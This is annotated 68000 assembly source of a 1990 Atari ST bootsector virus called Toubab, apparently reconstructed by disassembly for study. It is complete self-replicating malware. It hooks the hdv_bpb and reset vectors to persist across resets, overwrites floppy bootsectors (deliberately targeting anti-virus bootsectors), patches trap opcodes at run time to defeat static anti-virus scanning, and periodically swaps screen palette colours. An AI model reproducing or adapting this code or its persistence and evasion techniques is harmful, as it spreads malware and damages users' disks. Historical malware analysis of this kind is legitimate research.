; Toubab, The Virus Killer Killer
; Known names: Finland Virus 
; Symptoms: 
; - replicates iself
; - after 20 copies, it will swap colors 0 and 4 of the palette (Green and white)
; Replication: the replication is pretty complex but will occurs only on drive A:
;   - if this is the  Sagrotan virus killer
;   - if the bootsector is looking for resident program (RESIDENT_MAGIC)
;   - if the bootsector calling XBIOS flopwr => This Anti-Virus beeps and f... AntiVirus #1 from UVK, Satan's antivirus
;   - if the bootsector calling XBIOS protobt => This Anti-Virus beeps and f... AntiVirus #1 from UVK
;   - if the is not executable (word checksum != 0x1234)
; Resident address: 0x160
; Bootcode size: 481 bytes 
; Bootcode start: 0x1E
; Stealth location: 0x51200
; Attached vectors: hdv_bpb, resvec, undocumented reset-proof stealth location
; Reset resistance: Yes
; TOS compatible: All
;
; What's special? 
; - This virus checks some rules to decide to replicate or not
; - Trap opcodes are patched in realtime to avoid static code analysis done by some antiviruses

; ----------------------------------------------------------------------------------------------------------
; Registers
; ----------------------------------------------------------------------------------------------------------
DISKBUFP                        equ $4C6
RESIDENT_MAGIC                  equ $12123456
RESIDENT_CHK                    equ $5678
RESVEC_MAGIC                    equ $31415926
RESVALID                        equ $426                ; resvalid: $000426|long |Validates reset vector if $31415926
PALETTE                         equ $FF8240             ; $FF8240|word |Video palette register 0  Lowercase = LSB|R/W
HDV_BPB                         equ $472                ; $000472|long |Vector for getbpb for hard disk                      |hdv_bpb
RESVECTOR                       equ $42A                ; $00042A|long |Reset vector                                         |resvector

BOOT_CHK                        equ $1234

; ----------------------------------------------------------------------------------------------------------
; Variables
; ----------------------------------------------------------------------------------------------------------
VIRUS_RAM_LOCATION              equ $160
VARIABLES_LOCATION              equ $140
RESIDENT_PROGRAM_LOCATION       equ $51200
COUNTER                         equ $376
OLD_HDV_BPB_VECTOR_ADDR         equ $370
OLD_HDV_BPB_VECTOR_JMP_VALUE    equ VIRUS_RAM_LOCATION + (JMP_OLD_HDV_BPB_VECTOR-START)+2

HDV_BPB_VECTOR_ADDR             equ VIRUS_RAM_LOCATION + (HDV_BPB_VECTOR-START) ; $1AC
RESET_VECTOR_ADDR               equ VIRUS_RAM_LOCATION + (RESET_VECTOR-START)   ; $2BA


; ----------------------------------------------------------------------------------------------------------
; Constants
; ----------------------------------------------------------------------------------------------------------
COUNTER_VALUE                   equ $13             ; original $13, 20 copies
FLOPWR_PATTERN                  equ $94E4E
PROTOBT_PATTERN                 equ $124E4E
RESVEC_PATTERN                  equ RESVEC_MAGIC
BOOTSECTOR_START                equ $60180000

; ----------------------------------------------------------------------------------------------------------
; Code
; ----------------------------------------------------------------------------------------------------------
        
        org $1E

START:
        MOVE.W    #$82,D1                           ; d1 = 130
        BRA.S     .skip
        DS.W      1
.skip:
        LEA       START(PC),A0                      
        MOVEA.W   #VIRUS_RAM_LOCATION,A1            ; 0x160
.copy:
        MOVE.L    (A0)+,(A1)+
        DBF       D1,.copy                          ; copy 131x4 = 524 bytes from Bootcode to VIRUS_RAM_LOCATION

.set_variables:
        MOVEA.L   #VARIABLES_LOCATION,A1            ; A1 = 0x140

        ; not sure what it does
        MOVE.L    #$263C0000,(A1)                   ; patch 0x140 => MOVE.L #$aaaaaaaa,d3 ???

        ; this is too obfuscate the target address: 0x140+0x426-0x140 = 0x426
        MOVE.L    #RESVEC_MAGIC,(RESVALID-VARIABLES_LOCATION)(A1)  ; setting resvalid: RESVALID
        BRA.S     SET_VECTORS                       ; call set vectors routine

SOME_VARIABLE:
        DC.W      0

; ----------------------------------------------------------------------------------------------------------
; SET VECTORS
; A1 = VARIABLES_LOCATION = 0x140
; ----------------------------------------------------------------------------------------------------------
SET_VECTORS:
        ; same as before, this is address obfuscation, basically it sets the registers

        ; Set reset vector: copy RESET_VECTOR (0x2BA) to RESVECTOR
        MOVE.L    #RESET_VECTOR_ADDR,(RESVECTOR-VARIABLES_LOCATION)(A1)

        ; Set hdv_bpb vector: save HDV_BPB vector to OLD_HDV_BPB_VECTOR_ADDR and set HDV_BPB_VECTOR_ADDR to HDV_BPB
        MOVE.L    (HDV_BPB-VARIABLES_LOCATION)(A1),(OLD_HDV_BPB_VECTOR_ADDR-VARIABLES_LOCATION)(A1)
        MOVE.L    #HDV_BPB_VECTOR_ADDR,(HDV_BPB-VARIABLES_LOCATION)(A1)

        ; patch JMP with old hdv_bpb
        MOVE.L    (OLD_HDV_BPB_VECTOR_ADDR-VARIABLES_LOCATION)(A1),(OLD_HDV_BPB_VECTOR_JMP_VALUE-VARIABLES_LOCATION)(A1)
        RTS

; ----------------------------------------------------------------------------------------------------------
; HDV_BPB_VECTOR
; ----------------------------------------------------------------------------------------------------------
HDV_BPB_VECTOR:
        MOVEM.L   A0-A7/D0-D7,-(A7)
        BRA.S     DETECT

; ----------------------------------------------------------------------------------------------------------
; READ_OR_WRITE_BOOTSECTOR
; ----------------------------------------------------------------------------------------------------------
READ_OR_WRITE_BOOTSECTOR:
        MOVE.W    #1,-(A7)                          ; count = 1
        CLR.L     -(A7)                             ; side = 0 | track = 0
        MOVE.W    #1,-(A7)                          ; sector = 1
        CLR.W     -(A7)                             ; dev = A
        CLR.L     -(A7)                             ; rsrvd = 0
        MOVE.L    DISKBUFP.L,-(A7)                  ; buf = DISKBUFP
XBIOS_OPCODE:
        MOVE.W    #$28,-(A7)                        ; No #28 XBIOS, patched in different place to set floprd or flopwr
        TRAP      #$E                               ; Xbios
        ADDA.L    #$14,A7                           ; fix stack
        RTS

; ----------------------------------------------------------------------------------------------------------
; DETECT
; ----------------------------------------------------------------------------------------------------------
DETECT:
        LEA       XBIOS_OPCODE(PC),A3
        MOVE.B    #8,3(A3)                          ; patch XBIOS system call from 0x28 to 0x8. Ah... Ah... Ah...
        BSR.S     READ_OR_WRITE_BOOTSECTOR
        TST.W     D0
        BMI       DONE
        MOVE.B    #$28,3(A3)                        ; Patch again system call (to avoid detection?)

        ; this part looks for some patterns in existing boot sector to decide if it should be replaced or not

        ; Sagrotan bootsector
        MOVEA.L   DISKBUFP.L,A5                     ; A5 = floppy buf
        CMPI.L    #$426F6F74,$82(A5)                ; if bootsector[130] == "Boot" => (Sagrotan virus killer)
        BEQ       .replicate

        MOVEA.L   A5,A4                             ; else A4 = DISKBUFP
        ADDA.W    #$200,A4                          ; A4 = end of DISKBUFP (+512 => $16DA+$200 = $18DA)
        MOVE.L    #RESVEC_PATTERN,D6                ; D6 = RESVEC_PATTERN => footprint for resident program lookup
        MOVE.L    #FLOPWR_PATTERN,D4                ; D4 = FLOPWR_PATTERN ($94E4E) => footprint for Flopwr
        MOVE.L    #PROTOBT_PATTERN,D3               ; D3 = PROTOBT_PATTERN ($124E4E) => footprint for Protobt
.loop:
        MOVE.L    (A5),D2                           ; D2=DISKBUFP[i]
        CMP.L     D6,D2                             ; if boostsector[i] == RESVEC_MAGIC => Fuzion virus killer, The Killer, Amiga Demo, Big Demo, Medway Protector III, Virus Report
                                                    ; in fact any bootsector checking for resident programs
        BEQ.S     .replicate
        CMP.L     D4,D2                             ; if boostsector[i] == 0x94E4E => This Anti-Virus beeps and f... AntiVirus #1 from UVK, Satan's antivirus
                                                    ; it represents a MOVE.W #$09,-(sp) then TRAP #$E Flopwr call
        BEQ.S     .replicate
        CMP.L     D3,D2                             ; if boostsector[i] == 0x124E4E => This Anti-Virus beeps and f... AntiVirus #1 from UVK, ZOCH virus killer
                                                    ; it represents a MOVE.W #$12,-(sp) then TRAP #$E Protobt call
        BEQ.S     .replicate
        ADDQ.W    #2,A5                             ; else advance A5 of 2 bytes
        CMPA.W    A4,A5                             ; if not reach 512 bytes
        BGT.S     .done                             ; continue to check
        BRA.S     .loop
.done:
        ; check if existing bootsector is executable
        MOVEA.L   DISKBUFP.L,A5
        MOVE.W    #$FF,D5
.check_boot_checksum:
        ADD.W     (A5)+,D0
        DBF       D5,.check_boot_checksum
        CMP.W     #BOOT_CHK,D0
        BEQ.S     DONE                              ; if yes, don't touch it
.replicate:
        MOVEA.L   DISKBUFP.L,A5
        CLR.L     (A5)+                             ; 00 00 00 00 60 18
        MOVE.L    #BOOTSECTOR_START,(A5)+           ; Set Bootsector start which overlaps with the OEM bytes
        ADDA.L    #$16,A5                           ; advance of 22 bytes => 4+4+22 = bootcode ($1E)
        LEA       START(PC),A4
        MOVE.W    #$FF,D5
.copy:
        MOVE.W    (A4)+,(A5)+                       ; copy 512 bytes of bootcode to DISKBUFP+0x1E
        DBF       D5,.copy

        MOVEA.L   DISKBUFP.L,A5                     ; recompute the checksum
        MOVE.W    #$FF,D1                           ; D1 = 255
        CLR.W     D2
.calc_boot_checksum:
        ADD.W     (A5)+,D2
        DBF       D1,.calc_boot_checksum
        NEG.W     D2                                ; adjust checksum
        ADDI.W    #BOOT_CHK,D2                      ; add checkum
        MOVEA.L   DISKBUFP.L,A5                     ;
        MOVE.W    D2,6(A5)

        MOVE.B    #9,3(A3)                          ; patch XBIOS call to flopwr
        BSR       READ_OR_WRITE_BOOTSECTOR

; ----------------------------------------------------------------------------------------------------------
; SYMPTOMS
; ----------------------------------------------------------------------------------------------------------
SYMPTOMS:
        ADDQ.w    #$1, COUNTER.w                    ; add 1 to counter
        CMPI.W    #COUNTER_VALUE, COUNTER.w
        BLT.S     DONE                              ; if less than COUNTER_VALUE (20) copies, done
        CLR.W     COUNTER.w                         ; every 20nth copy, clear counter, run symptoms

        LEA.L     PALETTE.L,A0                      ; A0 = ST palette
        MOVE.W    (A0),D0                           ; swap palette[0] value with palette[4]
        MOVE.W    $4(A0),(A0)
        MOVE.W    D0,$4(A0)

; ----------------------------------------------------------------------------------------------------------
; DONE
; ----------------------------------------------------------------------------------------------------------
DONE:
        MOVEM.L   (A7)+,A0-A7/D0-D7

JMP_OLD_HDV_BPB_VECTOR:
        JMP       $FC1742                           ; TOS default HDV_BPB_VECTOR, will be patched at START

; ----------------------------------------------------------------------------------------------------------
; RESET_VECTOR
; ----------------------------------------------------------------------------------------------------------
RESET_VECTOR:
        LEA       RESIDENT_PROGRAM_LOCATION,A1      ; A1 = RESIDENT_PROGRAM_LOCATION ($51200), that's in RAM, at a $200 boundary
        MOVE.L    A1,D1                             ; D1 = RESIDENT_PROGRAM_LOCATION value
        MOVE.L    #RESIDENT_MAGIC,(A1)+             ; set magic number
        MOVE.L    D1,(A1)+                          ; set address value
        MOVE.W    #8,D0
        LEA       INSTALL_HDV_BPB_VECTOR(PC),A3     ; A3 = INSTALL_HDV_BPB_VECTOR
.copy:
        MOVE.W    (A3)+,(A1)+                       ; copy 8 words (16 bytes)
        DBF       D0,.copy

        MOVEA.L   D1,A3
        MOVE.W    #RESIDENT_CHK,D0
        MOVE.W    #$FE,D2                           ; d2 = 254
.calc_resident_checksum:
        SUB.W     (A3)+,D0
        DBF       D2,.calc_resident_checksum
        MOVE.W    D0,(A3)                           ; add checksum
        CLR.B     RESVALID.W
OLD_RESET_VECTOR:
        JMP       (A6)                              ; call old reset vector

; ----------------------------------------------------------------------------------------------------------
; INSTALL_HDV_BPB_VECTOR
; ----------------------------------------------------------------------------------------------------------
INSTALL_HDV_BPB_VECTOR:
        MOVE.L   #RESVEC_MAGIC, RESVALID.W
        MOVE.L   #HDV_BPB_VECTOR_ADDR, HDV_BPB.W      ; set hdv_pbp new vector to HDV_BPB_VECTOR_ADDR ($1AC)
        RTS

; ----------------------------------------------------------------------------------------------------------
; Unused message
; ----------------------------------------------------------------------------------------------------------
MESSAGE:
        DC.B     'Hi!R U nice?*Coding: Toubab*30/08/90*Cheksum, to be or not to ', $0

     END
